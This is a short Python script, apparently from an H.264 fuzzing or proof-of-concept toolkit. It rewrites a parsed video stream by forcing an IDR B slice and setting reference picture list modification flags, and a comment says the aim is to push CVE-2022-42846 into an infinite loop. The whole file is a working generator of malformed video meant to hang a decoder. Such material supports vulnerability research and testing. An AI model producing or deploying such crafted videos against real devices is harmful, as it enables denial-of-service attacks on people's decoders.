##
# IDR B slice
#
def idr_b_slice(ds):
    from slice_n_remove_residue import slice_n_remove_residue

    # First slice will be IDR
    ds["nalu_headers"][2]["nal_unit_type"] = 5
   
    # Slice 0 will be a B slice
    ds["slices"][0]["sh"]["slice_type"] = 1
   
    # Ensure ref pic list modification is called
    # This is for CVE-2022-42846 to get into an infinite loop
    ds["slices"][0]["sh"]["ref_pic_list_modification_flag_l0"] = True
    ds["slices"][0]["sh"]["modification_of_pic_nums_idc_l0"] = [3]

    ds = slice_n_remove_residue(0, ds)
   
    return ds

def modify_video(ds):
    return idr_b_slice(ds)